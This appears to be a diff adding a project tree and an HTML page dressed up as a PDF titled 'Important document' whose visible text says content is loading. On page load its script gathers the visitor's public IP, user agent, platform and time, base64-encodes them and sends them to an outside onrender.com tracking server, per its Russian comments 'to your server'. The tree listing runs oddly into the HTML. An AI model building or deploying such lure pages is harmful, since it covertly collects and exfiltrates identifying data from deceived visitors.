@@ -1,0 +1,30 @@
+
+├── app.py
+├── requirements.txt
+└── (<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Получаем IP и системную информацию
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const info = {
+      ip: data.ip,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      time: new Date().toISOString()
+    };
+    
+    // Отправляем на твой сервер
+    fetch('https://ip-2-t2jv.onrender.com/track?data=' + btoa(JSON.stringify(info)));
+  });
+</script>
+
+<!-- Видимое содержимое PDF -->
+<div style="font-family: Arial; padding: 20px;">
+  <h1>Важный документ</h1>
+  <p>Содержимое документа загружается...</p>
+</div>
+</body>
+</html>)
